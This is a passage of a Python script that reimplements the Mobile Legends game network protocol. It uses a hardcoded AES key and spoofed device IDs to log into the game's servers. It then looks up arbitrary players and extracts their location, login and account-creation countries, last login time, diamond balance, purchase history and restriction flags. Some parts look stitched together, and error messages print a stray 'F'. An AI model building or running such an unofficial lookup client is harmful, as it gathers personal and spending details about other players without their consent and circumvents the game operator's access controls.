        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        
        self.offset += n
        return val
    
    def _pack_header(self, tag: int, data_type: SdpDataType) -> None:
        if tag < 15:
            self.data += bytes([(data_type.value << 4) | tag])
        else:
            self.data += bytes([(data_type.value << 4) | 15])
            self.data += self._write_number(tag)
    
    def _pack(self, tag: int, value: Any) -> None:
        if isinstance(value, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_number(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_number(-value)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_number(value)
        elif isinstance(value, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            packed = struct.pack("<d", value)
            self.data += self._write_number(len(packed))
            self.data += packed
        elif isinstance(value, str) or isinstance(value, bytes):
            self._pack_header(tag, SdpDataType.STRING)
            encoded = value.encode('utf-8') if isinstance(value, str) else value
            self.data += self._write_number(len(encoded))
            self.data += encoded
        elif isinstance(value, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_number(len(value))
            for item in value:
                self._pack(0, item) 
        elif isinstance(value, dict):
            if isinstance(value, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(value.items()):
                    self._pack(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_number(len(value))
                for k, v in sorted(value.items()):
                    self._pack(0, k) 
                    self._pack(0, v) 
        else:
            raise SdpException(f"Unsupported type: {type(value)}")
    
    def _unpack(self) -> Tuple[int, Any]:
        try:
            if self.offset >= len(self.data):
                return 0, None
                
            header = self.data[self.offset]
            tag = header & 0xF
            data_type = SdpDataType(header >> 4)
            self.offset += 1
            
            if tag == 15: 
                tag = self._read_number()
            
            if data_type == SdpDataType.INTEGER_POSITIVE:
                value = self._read_number()
                return tag, value
            elif data_type == SdpDataType.INTEGER_NEGATIVE:
                value = -self._read_number()
                return tag, value
            elif data_type == SdpDataType.FLOAT:
                value = self._read_number().to_bytes(4, 'little')
                value = struct.unpack("<f", value)[0]
                return tag, value
            elif data_type == SdpDataType.DOUBLE:
                value = self._read_number().to_bytes(8, 'little')
                value = struct.unpack("<d", value)[0]
                return tag, value
            elif data_type == SdpDataType.STRING:
                length = self._read_number()
                try:
                    value = self.data[self.offset:self.offset+length].decode('utf-8')
                except UnicodeDecodeError:
                    value = self.data[self.offset:self.offset+length]
                self.offset += length
                return tag, value
            elif data_type == SdpDataType.LIST:
                length = self._read_number()
                value = []
                for _ in range(length):
                    _, item = self._unpack()
                    value.append(item)
                return tag, value
            elif data_type == SdpDataType.DICT:
                length = self._read_number()
                value = {}
                for _ in range(length):
                    _, k = self._unpack()
                    _, v = self._unpack()
                    value[k] = v
                return tag, value
            elif data_type == SdpDataType.STRUCT_BEGIN:
                struct_data = {}
                while True:
                    sub_tag, sub_value = self._unpack()
                    if isinstance(sub_value, SdpDataType) and sub_value == SdpDataType.STRUCT_END:
                        break
                    struct_data[sub_tag] = sub_value
            
                return tag, SdpStruct(struct_data)
            elif data_type == SdpDataType.STRUCT_END:
                return tag, SdpDataType.STRUCT_END
            else:
                raise SdpException(f"Unknown data type: F")
        except Exception as e:
            raise SdpException(f"Error unpacking data: F")
    
    def __repr__(self):
        return f"SdpStruct({dict(self)})"
    
    def copy(self):
        return SdpStruct(super().copy())
    
    def update(self, other):
        if isinstance(other, SdpStruct):
            super().update(other)
        else:
            super().update(other)
        self._pack_to_binary()

def repack_sdp(sdp: SdpStruct):
    d = {}
    for k, v in sdp.items():
        d[k] = v
    return SdpStruct(d)

def sdp_to_bytes(data):
    if isinstance(data, SdpStruct):
        return data.data
    else:
        return SdpStruct(data).data

def bytes_to_sdp(data):
    return SdpStruct(data)

def print_sdp(data):
    if isinstance(data, SdpStruct):
        return repr(data)
    else:
        return repr(SdpStruct(data))


VERBOSE_MODE = False

def debug_print(message):
    if VERBOSE_MODE or DEBUG_MODE:
        print(f"{Fore.MAGENTA}[VERB] {message}{Style.RESET_ALL}")

def setup_logger():
    logger = logging.getLogger('ML')
    
    if VERBOSE_MODE or DEBUG_MODE:
        logger.setLevel(logging.INFO)
    else:
        logger.setLevel(logging.ERROR)
        
    handler = logging.StreamHandler()
    handler.setFormatter(logging.Formatter('[ML] %(message)s'))
    logger.addHandler(handler)
    return logger

logger = setup_logger()

def load_device_ids():
    if not DEVICE_IDS:
        # Return a default list if user hasn't provided any
        return ['ios_D08FE22A-7074-4DEB-BC67-78EEA4FD11B6_1714741163095700']
    return DEVICE_IDS.copy()

def load_device_models():
    if not DEVICE_MODELS:
        return ['Xiaomi:Redmi Note 12']
    return DEVICE_MODELS.copy()

def remove_failed_device_id(failed_device_id):
    global DEVICE_IDS
    if failed_device_id in DEVICE_IDS:
        DEVICE_IDS.remove(failed_device_id)
        return True
    else:
        return False

AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV = b'\x00' * 16

class BaseConnection:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket = None
        self.queue_data = b''

    def __enter__(self):
        self.connect()
        return self
    
    def __exit__(self, exc_type, exc, tb):
        self.cleanup()

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(2)

    def cleanup(self):
        if self.socket:
            self.socket.close()
            self.sequence = 1
            self.socket = None

    def send_data(self, id, sdp):
        packet = SdpStruct({
            0: id,
            1: self.sequence,
            5: sdp.data
        }).data
        buf = zstd.compress(packet)
        flags = (len(buf) + 4) | (16 << 24)
        buf = flags.to_bytes(4, 'big') + buf
        dbg(f"SEND  packet_id={id}  seq={self.sequence}  payload_bytes={len(sdp.data)}  compressed={len(buf)}")
        dbg(f"      SDP fields", dict(sdp))
        self.socket.send(buf)
        self.sequence += 1

    def recv_data(self):
        try:
            while len(self.queue_data) < 4:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data

            flags = int.from_bytes(self.queue_data[:4], 'big')
            size = flags & 0xFFFFFF
            compression_type = flags >> 24
            
            self.last_header_size = size
            
            while len(self.queue_data) < size:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data

            data = self.queue_data[4:size]
            self.queue_data = self.queue_data[size:]
            
            if compression_type == 1:
                data = zlib.decompress(data)
            elif compression_type == 16:
                data = zstd.decompress(data)
            elif compression_type == 2:
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                if len(data) % 16 != 0:
                    data = cipher.decrypt(data[:-1])
                else:
                    data = cipher.decrypt(data)
                data = data.rstrip(b'\x00')
            elif compression_type == 3:
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                if len(data) % 16 != 0:
                    data = cipher.decrypt(data[:-1])
                else:
                    data = cipher.decrypt(data)
                data = data.rstrip(b'\x00')
                data = zlib.decompress(data)
            elif compression_type == 18:
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                if len(data) % 16 != 0:
                    decrypted_data = cipher.decrypt(data[:-1])
                else:
                    decrypted_data = cipher.decrypt(data)
                data = zstd.decompress(decrypted_data.rstrip(b'\x00'))

            result = SdpStruct(data)
            id = result[0]
            if id is None:
                dbg("RECV  id=None — dropped")
                return None, None

            res = result.get(6, None)
            if not res or not isinstance(res, bytes):
                res = result.get(5, None)
                if not res or not isinstance(res, bytes):
                    dbg(f"RECV  id={id}  body=<empty>", color=Fore.YELLOW)
                    return id, None

            parsed_res = SdpStruct(res)
            dbg(f"RECV  id={id}  body_bytes={len(res)}  compression_type={compression_type}", color=Fore.CYAN)
            dbg(f"      SDP fields", dict(parsed_res), color=Fore.CYAN)
            return id, parsed_res

        except socket.timeout:
            return -1, None 
        except Exception as e:
            return None, None

class GameConnection(BaseConnection):
    def __init__(self, device_id, device_model=None):
        super().__init__('login.ml.youngjoygame.com', 30021)
        self.device_id = device_id
        self.device_model = device_model or "Xiaomi:Redmi Note 12"
    
        parts = self.device_id.split('_')
        if len(parts) >= 2:
            device_info = parts[1]
        
            if len(parts) >= 3 and len(device_info) < 32:
                device_info = device_info + "_" + parts[2]
                
            if len(device_info) >= 32:
                self.imei_md5 = device_info[:32]
                if len(device_info) >= 48:
                    self.android_id = device_info[32:48]
                    if len(device_info) > 48:
                        self.advertising_id = device_info[48:]
                    else:
                        self.advertising_id = ""
                else:
                    self.android_id = ""
                    self.advertising_id = ""
            else:
                self.imei_md5 = device_info
                self.android_id = ""
                self.advertising_id = ""
        else:
            self.imei_md5 = device_id
            self.android_id = ""
            self.advertising_id = ""
        
        self.channel = 'and_usa'
        self.client_version = '2.2.16.1232.1'
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_server_host = ''
        self.game_server_port = 0
        self.creation_ts = 0

    def login_to_login_server(self):
        if self.host != 'login.ml.youngjoygame.com' or self.port != 30021:
            self.cleanup()
            self.host = 'login.ml.youngjoygame.com'
            self.port = 30021
            self.connect()

        dbg(f"LOGIN SERVER → sending packet 1  device_id={self.device_id[:30]}...")
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
            2: self.client_version,
            3: self.channel,
            4: 'en'
        }))

        id, res = self.recv_data()
        dbg(f"LOGIN SERVER ← response id={id}")
        if id == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res[1]
            self.zone_id = res[2][0]
            self.creation_ts = res.get(19, 0)
            dbg(f"LOGIN OK  account_id={self.account_id}  zone_id={self.zone_id}  session_key={str(self.session_key)[:20]}...  creation_ts={self.creation_ts}", color=Fore.GREEN)
            return True
        else:
            dbg(f"LOGIN FAILED  id={id}  res={res}", color=Fore.RED)
            return False

    def get_game_server(self):
        dbg(f"GAME SERVER → sending packet 5  account_id={self.account_id}")
        self.send_data(5, SdpStruct({
            0: self.account_id,
            1: self.session_key,
            2: self.client_version,
            5: self.zone_id,
            6: self.channel
        }))
        
        id, res = self.recv_data()
        dbg(f"GAME SERVER ← response id={id}")
        if id == 6 and res:
            game_server = res[1]
            self.game_server_host, self.game_server_port = game_server.split(':')
            self.game_server_port = int(self.game_server_port)
            dbg(f"GAME SERVER OK  host={self.game_server_host}  port={self.game_server_port}", color=Fore.GREEN)
            return True
        else:
            dbg(f"GAME SERVER FAILED  id={id}", color=Fore.RED)
            return False

    def connect_to_game_server(self):
        self.cleanup()
        self.host = self.game_server_host
        self.port = self.game_server_port
        self.connect()
        dbg(f"GAME CONN → sending handshake 10001 + 10101  account_id={self.account_id}  zone_id={self.zone_id}")
        
        self.send_data(10001, SdpStruct({
            0: self.account_id,
            1: self.session_key,
            2: self.zone_id,
            4: self.client_version,
            13: self.channel,
            15: self.device_id
        }))
        
        self.send_data(10101, SdpStruct({
            0: 0,
            2: 2,
        }))
        
        while True:
            id, res = self.recv_data()
            if id is None:
                dbg("GAME CONN ← id=None  aborting", color=Fore.RED)
                return False
            elif id == 10002:
                dbg("GAME CONN ← 10002  connected OK", color=Fore.GREEN)
                return True
            elif id == -1: 
                dbg("GAME CONN ← timeout", color=Fore.RED)
                return False
            else:
                dbg(f"GAME CONN ← unexpected id={id}  (waiting for 10002...)", color=Fore.YELLOW)
        
        return False

    def lookup_player(self, search_value, search_type="id", server_filter=None):
        if search_type == "id":
            lookup_data = SdpStruct({
                1: int(search_value)  
            })
        else:  
            lookup_data = SdpStruct({
                0: str(search_value).strip()
            })
        
        dbg(f"LOOKUP → packet 11153  type={search_type}  value={search_value}  server_filter={server_filter}")
        self.send_data(11153, lookup_data)
        
        id_20001_count = 0
        
        while True:
            id, res = self.recv_data()
            
            if id is None:
                dbg("LOOKUP ← id=None", color=Fore.RED)
                return None
            elif id == -1: 
                dbg("LOOKUP ← timeout", color=Fore.RED)
                return None
            elif id == 11154:
                dbg(f"LOOKUP ← 11154  RESULT RECEIVED", color=Fore.GREEN)
                if search_type == "nickname" and server_filter is not None:
                    filtered_result = self.filter_by_server(res, server_filter)
                    dbg(f"LOOKUP filter_by_server={server_filter}  matched={filtered_result is not None}", color=Fore.GREEN)
                    return filtered_result
                else:
                    return res
            elif id == 20001:
                id_20001_count += 1
                dbg(f"LOOKUP ← 20001  (interim/keep-alive #{id_20001_count}  header_size={self.last_header_size})", color=Fore.YELLOW)
                
                if self.last_header_size < 100 and id_20001_count >= 2:
                    dbg("LOOKUP ← 20001 x2 small  → player not found", color=Fore.RED)
                    return None
            else:
                dbg(f"LOOKUP ← unexpected id={id}", color=Fore.YELLOW)
                    

    def get_role_info(self, role_id, zone_id):
        try:
            dbg(f'ROLE INFO -> packet 10128  role_id={role_id}  zone_id={zone_id}')
            self.send_data(10128, SdpStruct({
                1: int(role_id),
                2: int(zone_id),
            }))
            best_res = None
            for _ in range(30):
                id, res = self.recv_data()
                if id is None:
                    dbg('ROLE INFO <- connection closed', color=Fore.RED)
                    break
                elif id == -1:
                    dbg('ROLE INFO <- socket timeout', color=Fore.YELLOW)
                    break
                elif id == 20001:
                    dbg(f'ROLE INFO <- 20001 keep-alive — skipping', color=Fore.YELLOW)
                    continue
                elif id == 10129:
                    dbg(f'ROLE INFO <- 10129  raw_fields={dict(res) if res else EMPTY}', color=Fore.GREEN)
                    if res is None:
                        continue
                    if best_res is None:
                        best_res = res
                    if res.get(9, 0) > 0:
                        return res
                    continue
                else:
                    dbg(f'ROLE INFO <- id={id} (unexpected, skipping)', color=Fore.YELLOW)
                    continue
            if best_res is not None:
                dbg(f'ROLE INFO <- returning best response', color=Fore.GREEN)
                return best_res
            dbg('ROLE INFO <- no response received', color=Fore.RED)
            return None
        except Exception as e:
            dbg(f'ROLE INFO error: {e}', color=Fore.RED)
            return None

    def get_skin_role_info(self, role_id, zone_id, max_retries=3):
        for attempt in range(max_retries):
            try:
                dbg(f'SKIN ROLE INFO -> packet 10143  role_id={role_id}  zone_id={zone_id}')
                self.send_data(10143, SdpStruct({
                    0: int(role_id),
                    1: int(zone_id),
                }))
                timeout_count = 0
                max_timeouts = 3
                while timeout_count < max_timeouts:
                    pid, res = self.recv_data()
                    if pid is None:
                        break
                    elif pid == -1:
                        timeout_count += 1
                    elif pid == 10144:
                        dbg(f'SKIN ROLE INFO <- 10144  tags={list(dict(res).keys())[:20] if res else []}', color=Fore.GREEN)
                        return res
                    elif pid == 20001:
                        continue
                    else:
                        continue
                if attempt < max_retries - 1:
                    pass
            except Exception as e:
                dbg(f'SKIN ROLE INFO error: {e}', color=Fore.RED)
                if attempt < max_retries - 1:
                    pass
        return None

    def get_v2l_status(self, role_id, zone_id, max_retries=2):
        for attempt in range(max_retries):
            try:
                dbg(f'V2L STATUS -> packet 10208  role_id={role_id}  zone_id={zone_id}')
                self.send_data(10208, SdpStruct({
                    0: int(role_id),
                    1: int(zone_id),
                }))
                timeout_count = 0
                max_timeouts = 2
                while timeout_count < max_timeouts:
                    pid, res = self.recv_data()
                    if pid is None:
                        break
                    elif pid == -1:
                        timeout_count += 1
                    elif pid == 10208:
                        dbg(f'V2L STATUS <- 10208  tags={list(dict(res).keys())[:20] if res else []}', color=Fore.GREEN)
                        if res:
                            return {"_source": 10208, "_data": dict(res)}
                    elif pid == 20001:
                        continue
                    else:
                        continue

                dbg(f'V2L STATUS -> packet 10145 (fallback)  role_id={role_id}  zone_id={zone_id}')
                self.send_data(10145, SdpStruct({
                    0: int(role_id),
                    1: int(zone_id),
                }))
                timeout_count = 0
                while timeout_count < max_timeouts:
                    pid, res = self.recv_data()
                    if pid is None:
                        break
                    elif pid == -1:
                        timeout_count += 1
                    elif pid in (10146, 10160):
                        dbg(f'V2L STATUS <- {pid}  tags={list(dict(res).keys())[:20] if res else []}', color=Fore.GREEN)
                        if res:
                            return {"_source": pid, "_data": dict(res)}
                    elif pid == 20001:
                        continue
                    else:
                        continue
            except Exception as e:
                dbg(f'V2L STATUS error: {e}', color=Fore.RED)
        return None

    def filter_by_server(self, result, target_server):
        if not result or not result.get(0):
            return None
        
        players_list = result[0]
        
        for player in players_list:
            if isinstance(player, dict):
                player_server = player.get(1)  
                
                if player_server == target_server:
                    filtered_result = {0: [player]}
                    return filtered_result
        
        return None

    def __enter__(self):
        super().__enter__()
    
        if not self.login_to_login_server():
            raise ConnectionError("LOGIN_FAILED")
        if not self.get_game_server():
            raise ConnectionError("SERVER_SELECTION_FAILED")
        return self


def format_timestamp(timestamp):
    try:
        utc_dt = datetime.datetime.fromtimestamp(timestamp, datetime.timezone.utc)
        pht_dt = utc_dt + datetime.timedelta(hours=8)
        pht_date_str = pht_dt.strftime("%Y-%m-%d %H:%M")

        now_pht = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=8)
        delta = pht_dt - now_pht

        total_seconds = int(delta.total_seconds())
        if total_seconds >= 0:
            days    = total_seconds // 86400
            hours   = (total_seconds % 86400) // 3600
            minutes = (total_seconds % 3600) // 60
            rel_str = f"(in {days}d {hours}h {minutes}m)"
        else:
            total_seconds = abs(total_seconds)
            days    = total_seconds // 86400
            hours   = (total_seconds % 86400) // 3600
            minutes = (total_seconds % 3600) // 60
            rel_str = f"({days}d {hours}h {minutes}m ago)"

        return f"{pht_date_str} {rel_str} PHT"
    except:
        return "Invalid timestamp"


def format_timestamp_full(timestamp):
    try:
        utc_dt = datetime.datetime.fromtimestamp(timestamp, datetime.timezone.utc)
        pht_dt = utc_dt + datetime.timedelta(hours=8)
        return pht_dt.strftime("%Y-%m-%d %H:%M:%S")
    except:
        return "Invalid timestamp"


def parse_skin_counts(tag_118):
    if not tag_118 or not isinstance(tag_118, dict):
        return {}

    skin_data = None
    for k in (4, '4'):
        v = tag_118.get(k)
        if isinstance(v, dict) and v:
            skin_data = v
            break

    if skin_data is None:
        skin_data = tag_118

    if not isinstance(skin_data, dict):
        return {}

    skin_types = {
        6: "Supreme Skins",
        5: "Grand Skins",
        4: "Exquisite Skins",
        3: "Deluxe Skins",
        2: "Exceptional Skins",
        1: "Common Skins"
    }

    skin_counts = {}
    for skin_id, count in skin_data.items():
        try:
            skin_id_int = int(skin_id)
        except (ValueError, TypeError):
            continue
        if skin_id_int in skin_types:
            skin_counts[skin_types[skin_id_int]] = count
    return skin_counts

def extract_player_data(result, role_info=None, creation_ts=0, v2l_data=None):
    if not result or not result[0] or len(result[0]) == 0:
        return None
    
    try:
        player_data = result[0][0]
        
        nickname = player_data.get(2, "Unknown")
        player_id = player_data.get(0, "Unknown")
        server = player_data.get(1, "Unknown")
        level = player_data.get(3, "Unknown")

        skin = player_data.get(83, "Unknown")
        hero_count  = player_data.get(4, 0)
        matches     = player_data.get(17, 0)
        rating_score   = player_data.get(9, 0)
        if role_info:
            hero_count = role_info.get(9, hero_count)
            matches    = role_info.get(22, matches)
        
        location = "NOT FOUND"
        location_data = player_data.get(71, None)
        if location_data and isinstance(location_data, list) and len(location_data) >= 2:
            location = ", ".join(location_data)
        
        last_login = player_data.get(5, 0)
        last_login_formatted = format_timestamp(last_login)
        
        last_login_country = player_data.get(87, "Unknown")
        create_account_country = player_data.get(97, "Unknown")
        
        squad_icon = player_data.get(31, "")
        squad_name = player_data.get(30, "").replace("`", "").strip()
        squad = f"{squad_icon} {squad_name}".strip() if squad_name else "—"
        squad_id = 0
        if role_info and isinstance(role_info, dict):
            squad_id = role_info.get(34, 0)
        if not squad_id:
            squad_id = player_data.get(34, player_data.get(28, 0))
        _squad_fullname = ""
        if role_info and isinstance(role_info, dict):
            _squad_fullname = role_info.get(17, "") or ""
        if not _squad_fullname:
            _squad_fullname = player_data.get(30, "").replace("`", "").strip()
        if squad_id:
            squad_id_display = f"Squad ID: {squad_id}"
        else:
            squad_id_display = "N/A"



        tag_95 = player_data.get(95)
        tag_8 = player_data.get(8)
        high_rank = map_rank(tag_95) if tag_95 is not None else "Unknown"
        current_rank = map_rank(tag_8) if tag_8 is not None else "Unknown"
        achievement_points = player_data.get(7, 0)
        
        tag_136 = player_data.get(136, {})
        collector_point = tag_136.get(9, 0) if isinstance(tag_136, dict) else 0
        collector_rank = tag_136.get(10, 0) if isinstance(tag_136, dict) else 0
        collector_tier = map_collector_point(collector_point)
        
        tag_91 = player_data.get(91, [])
        hero_history = get_hero_history(tag_91) if tag_91 else ["Private / Not Available"]

        v2l_status = "N/A"
        if v2l_data and isinstance(v2l_data, dict):
            source = v2l_data.get("_source", 0)
            data = v2l_data.get("_data", {})
            if source == 10208:
                for _tag in (10, 11):
                    _v = data.get(_tag)
                    if _v is not None:
                        try:
                            val = int(_v)
                            v2l_status = "Enabled" if val > 0 else "Disabled"
                            break
                        except (ValueError, TypeError):
                            pass
            else:
                for _tag in (0, 2, 3, 5):
                    _v = data.get(_tag)
                    if _v is not None:
                        try:
                            val = int(_v)
                            v2l_status = "Enabled" if val > 0 else "Disabled"
                            break
                        except (ValueError, TypeError):
                            pass

        followers = 0
        if role_info and isinstance(role_info, dict):
            followers = role_info.get(23, 0)
        if not followers:
            followers = player_data.get(15, 0)

        popularity = player_data.get(14, 0)

        bio = player_data.get(24, "").strip() if isinstance(player_data.get(24), str) else ""

        likes = 0
        if role_info and isinstance(role_info, dict):
            likes = role_info.get(24, 0)
        if not likes:
            likes = player_data.get(61, 0)

        credits_score = "N/A"
        _cs_val = 0
        if role_info and isinstance(role_info, dict):
            _cs_val = role_info.get(20, 0)
        if _cs_val and isinstance(_cs_val, int) and _cs_val > 0:
            credits_score = f"{_cs_val}/110"
        else:
            _cs_fb = player_data.get(80, 0)
            if _cs_fb and isinstance(_cs_fb, int) and _cs_fb > 0:
                credits_score = f"{_cs_fb}/110"

        restriction_flags = "None"
        _t117 = None
        if role_info and isinstance(role_info, dict):
            _t117 = role_info.get(117)
        if _t117 is None:
            _t117 = player_data.get(117)
        if _t117 is not None:
            if isinstance(_t117, dict):
                _raw = _t117.get(0, 0)
            else:
                try:
                    _raw = int(_t117)
                except:
                    _raw = 0
            _flag_count = int(_raw) + 1
            _total_bits = 7
            _pct = round((_flag_count / _total_bits) * 100, 1)
            if _pct < 30:
                _risk, _risk_icon = "Low Risk", "✅"
            elif _pct < 60:
                _risk, _risk_icon = "Medium Risk", "⚠️"
            else:
                _risk, _risk_icon = "High Risk", "🚨"
            restriction_flags = f"{_pct}% {_risk_icon} ({_risk})"

        _t135 = player_data.get(135, {})
        _aff_level = _t135.get(1, 0) if isinstance(_t135, dict) else 0
        _AFFINITY_MAP = {0:"None", 1:"Bronze", 2:"Silver", 3:"Gold", 4:"Platinum", 5:"Diamond"}
        _aff_tier = _AFFINITY_MAP.get(_aff_level, f"Level {_aff_level}") if _aff_level else "None"
        _aff_names = []
        if role_info and isinstance(role_info, dict):
            _tag82 = role_info.get(82, [])
            if isinstance(_tag82, list):
                for _entry in _tag82:
                    if isinstance(_entry, dict):
                        _aff_name = _entry.get(2, "")
                        if _aff_name and isinstance(_aff_name, str):
                            _aff_names.append(_aff_name)
        if _aff_names:
            affinity_label = ', '.join(_aff_names)
        else:
            affinity_label = _aff_tier

        _skin_ts = player_data.get(176, 0)
        latest_skin_date = format_timestamp(_skin_ts) if _skin_ts else "N/A"

        _latest_skin_id = player_data.get(175, 0)
        latest_skin_tier = get_skin_tier(_latest_skin_id) if _latest_skin_id else "N/A"
        if _latest_skin_id:
            _tier_label = latest_skin_tier if latest_skin_tier and latest_skin_tier != "N/A" else "Unknown Tier"
            latest_skin_id_str = f"{_latest_skin_id} ({_tier_label})"
        else:
            latest_skin_id_str = "N/A"

        import time as _time
        _SL_TAGS = [21, 47, 50]
        _sl_expiry = 0
        for _sl_t in _SL_TAGS:
            if _sl_expiry:
                break
            if role_info and isinstance(role_info, dict):
                _v = role_info.get(_sl_t, 0) or 0
                if isinstance(_v, int) and _v > 1700000000:
                    _sl_expiry = _v
        for _sl_t in _SL_TAGS:
            if _sl_expiry:
                break
            _v = player_data.get(_sl_t, 0) or 0
            if isinstance(_v, int) and _v > 1700000000:
                _sl_expiry = _v
        if _sl_expiry:
            if _sl_expiry > _time.time():
                starlight_user = "Yes ⭐"
            else:
                starlight_user = "No"
            starlight_expiry = format_timestamp(_sl_expiry)
        else:
            starlight_user = "No"
            starlight_expiry = "N/A"

        starlight_months = player_data.get(60, 0)

        tickets = 0
        if role_info and isinstance(role_info, dict):
            tickets = role_info.get(49, 0)
        if not tickets:
            tickets = player_data.get(49, 0)

        total_wins = player_data.get(18, 0)

        _MIN_VALID_TS = 1451577600
        _create_ts_fallback = player_data.get(6, 0)
        if creation_ts and creation_ts >= _MIN_VALID_TS:
            creation_date = format_timestamp_full(creation_ts)
        elif _create_ts_fallback and _create_ts_fallback >= _MIN_VALID_TS:
            creation_date = format_timestamp_full(_create_ts_fallback)
        else:
            creation_date = "N/A"

        account_age = "N/A"
        _age_ts = creation_ts if (creation_ts and creation_ts >= _MIN_VALID_TS) else \
                  (_create_ts_fallback if (_create_ts_fallback and _create_ts_fallback >= _MIN_VALID_TS) else 0)
        if _age_ts:
            _now_utc = datetime.datetime.now(datetime.timezone.utc)
            _create_dt = datetime.datetime.fromtimestamp(_age_ts, datetime.timezone.utc)
            _age_delta = _now_utc - _create_dt
            _age_years = _age_delta.days // 365
            _age_months = (_age_delta.days % 365) // 30
            _age_days_rem = _age_delta.days % 30
            if _age_years > 0:
                account_age = f"{_age_years}y {_age_months}m {_age_days_rem}d"
            elif _age_months > 0:
                account_age = f"{_age_months}m {_age_days_rem}d"
            else:
                account_age = f"{_age_delta.days}d"

        _tag45 = player_data.get(45, {})
        if isinstance(_tag45, dict) and _tag45:
            _hero_entries = []
            for _entry in _tag45.values():
                if isinstance(_entry, dict):
                    _hid = _entry.get(0, 0)
                    _hts = _entry.get(1, 0)
                    _hname = HERO_ID_MAP.get(_hid, f"Unknown({_hid})")
                    _hero_entries.append((_hts, _hname))
            _hero_entries.sort(key=lambda x: x[0], reverse=True)
            last_heroes_purchase = ", ".join(h for _, h in _hero_entries) if _hero_entries else "N/A"
        else:
            _hero_buy_ts = player_data.get(175, 0)
            last_heroes_purchase = format_timestamp(_hero_buy_ts) if _hero_buy_ts else "N/A"

        mcl_wins = 0
        if role_info and isinstance(role_info, dict):
            mcl_wins = role_info.get(46, 0)
        if not mcl_wins:
            mcl_wins = player_data.get(104, player_data.get(103, 0))

        win_count = 0
        if role_info and isinstance(role_info, dict):
            win_count = role_info.get(22, 0)

        total_battles = 0
        if role_info and isinstance(role_info, dict):
            total_battles = role_info.get(77, 0)
        if not total_battles:
            total_battles = player_data.get(17, 0)

        _wins_for_rate = win_count if win_count else total_wins
        if total_battles > 0 and _wins_for_rate > 0:
            _wr_val = (_wins_for_rate / total_battles) * 100
            if _wr_val > 100:
                win_rate = f"{min(_wr_val, 100):.1f}% (approx)"
            else:
                win_rate = f"{_wr_val:.1f}%"
        else:
            win_rate = "N/A"

        squad_motto = "N/A"
        if role_info and isinstance(role_info, dict):
            _motto = role_info.get(24, "")
            if _motto and isinstance(_motto, str):
                squad_motto = _motto

        diamonds = 0
        bp = 0
        if role_info and isinstance(role_info, dict):
            _currency_raw = role_info.get(111, None)
            if isinstance(_currency_raw, dict):
                diamonds = int(_currency_raw.get(0, 0) or 0)
                bp       = int(_currency_raw.get(1, 0) or 0)
            elif isinstance(_currency_raw, int):
                diamonds = int(_currency_raw or 0)
        if not bp:
            bp = int(player_data.get(83, 0) or 0)

        _diamond_buy_ts = player_data.get(42, 0)
        if _diamond_buy_ts and isinstance(_diamond_buy_ts, int) and _diamond_buy_ts > 1000000000:
            last_diamond_purchase = format_timestamp(_diamond_buy_ts)
        else:
            last_diamond_purchase = "N/A"

        starlight_count = 0
        if role_info and isinstance(role_info, dict):
            starlight_count = role_info.get(60, 0)

        skin_history = []
        if role_info and isinstance(role_info, dict):
            _tag92 = role_info.get(92, [])
            if isinstance(_tag92, list):
                for _entry in _tag92[:5]:
                    if isinstance(_entry, dict):
                        _sid  = _entry.get(0, 0)
                        _tier = _entry.get(2, 0)
                        _ts   = _entry.get(4, 0)
                        _tier_name = {1:"Common",2:"Exceptional",3:"Deluxe",
                                      4:"Exquisite",5:"Grand",6:"Supreme"}.get(_tier, f"T{_tier}")
                        _date = format_timestamp(_ts) if _ts else "?"
                        skin_history.append(f"SkinID:{_sid}({_tier_name})|{_date}")
        skin_history_str = ", ".join(skin_history) if skin_history else "N/A"

        _EMBLEM_MAP = {1:"Fighter",2:"Assassin",3:"Mage",4:"Marksman",
                       5:"Support",6:"Tank",7:"Common"}
        emblem_levels = "N/A"
        if role_info and isinstance(role_info, dict):
            _tag101 = role_info.get(101, {})
            if isinstance(_tag101, dict) and _tag101:
                _parts = []
                for _eid in sorted(_tag101.keys()):
                    _ename = _EMBLEM_MAP.get(_eid, f"E{_eid}")
                    _parts.append(f"{_ename}:Lv{_tag101[_eid]}")
                emblem_levels = ", ".join(_parts) if _parts else "N/A"

        skin_counts = {
            "Supreme Skins":     0,
            "Grand Skins":       0,
            "Exquisite Skins":   0,
            "Deluxe Skins":      0,
            "Exceptional Skins": 0,
            "Common Skins":      0,
        }
        _tag118 = None
        if role_info and isinstance(role_info, dict):
            _tag118 = role_info.get(118)
        if not _tag118:
            _tag118 = player_data.get(118)
        if _tag118:
            _parsed_skins = parse_skin_counts(_tag118)
            if _parsed_skins:
                skin_counts.update(_parsed_skins)
        
        return {
            'nickname': nickname,
            'player_id': player_id,
            'server': server,
            'level': level,
            'skin_count': skin,
            'hero_count': hero_count,
            'matches': matches,
            'rating_score': rating_score,
            'location': location,
            'last_login': last_login_formatted,
